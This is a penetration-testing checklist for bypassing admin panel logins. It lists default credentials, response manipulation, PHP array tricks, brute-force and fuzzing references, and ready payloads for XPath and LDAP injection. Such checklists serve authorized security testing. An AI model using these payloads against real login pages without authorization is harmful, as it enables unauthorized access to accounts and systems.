# admin panal checklist

* [ ] **Default Credentials**
  * Test common default credentials:
    * `admin:admin`
    * `admin:password`
    * `author:author`
    * `administrator:password`
    * `admin123:password`
    * `username:pass12345`
    * Other known default credentials
* [ ] **Bypass via SQL Injection**
  * Attempt SQL injection on the username or password fields using various payloads:
    * **Error-Based**: Use payloads that generate SQL errors.
    * **Time-Based**: Inject payloads that induce time delays.
* [ ] **Bypass via Cross-Site Scripting (XSS)**
  * Inject XSS payloads in username or password fields:
    * URL encode the payloads.
    * Base64 encode the payloads.
* [ ] **By Manipulating the Response**
  * Change the HTTP response status or message:
    * `200 => 302`
    * `failed => success`
    * `error => success`
    * `403 => 200`
    * `403 => 302`
    * `false => true`
* [ ] **Bypass via Brute Force Attack**
  * Reference guides on performing brute force attacks:
    * [How to Perform Login Brute Force Using Burp Suite](https://portswigger.net/support/using-burp-to-brute-force-a-login-page)
    * [Broken Brute Force Protection](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)
* [ ] **Bypass via Directory Fuzzing Attack**
  * Use the fuzzing list from [OneListForAll](https://github.com/six2dez/OneListForAll) to discover hidden paths.
* [ ] **By Removing Parameters in Request**
  * If the site responds with specific error messages for incorrect credentials, intercept the request and try removing the password parameter, then resend to see if it logs in.
* [ ] **Check JS File on Login Page**
  * Analyze any JavaScript files linked to the login page for hardcoded paths or credentials.
* [ ] **Check for Comments Inside the Page**
  * Look for comments in the HTML source that might contain sensitive information.
* [ ] **Check PHP Comparison Errors**
  * Test various payloads such as:
    * `user[]=a&pwd=b`
    * `user=a&pwd[]=b`
    * `user[]=a&pwd[]=b`
* [ ] **Change Content-Type to JSON**
  * Send JSON data (including boolean values) in the request body, potentially using a GET request with `Content-Type: application/json`.
* [ ] **Check Node.js Parsing Errors**
  * Investigate if Node.js is improperly parsing the payloads, potentially leading to SQL injection-like vulnerabilities.
* [ ] **NoSQL Injection Bypass**
  * Refer to [NoSQL Injection Techniques](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass).
* [ ] **XPath Injection**
  * Test XPath injection payloads such as:
    * `' or '1'='1`
    * `' or ''='`
    * `' or 1]%00`
    * `' or /* or '`
    * `' or "a" or '`
    * `' or 1 or '`
    * `' or true() or '`
    * `'or string-length(name(.))<10 or'`
    * `'or contains(name,'adm') or'`
    * `'or contains(.,'adm') or'`
    * `'or position()=2 or'`
    * `admin' or '`
    * `admin' or '1'='2`
* [ ] **LDAP Injection**
  * Test various LDAP injection payloads:
    * `*`
    * `*)(&`
    * `*)(|(&`
    * `pwd)`
    * \`*)(|(*
    * `*))%00`
    * `admin)(&)`
    * `pwd`
    * `admin)(!(&(|`
    * `pwd))`
    * `admin))(|(|`
* [ ] **Authorization Bypass**
  * Review advisories and techniques for bypassing authorization, such as found in [this advisory](https://www.securify.nl/en/advisory/authorization-bypass-in-infinitewp-admin-panel/).
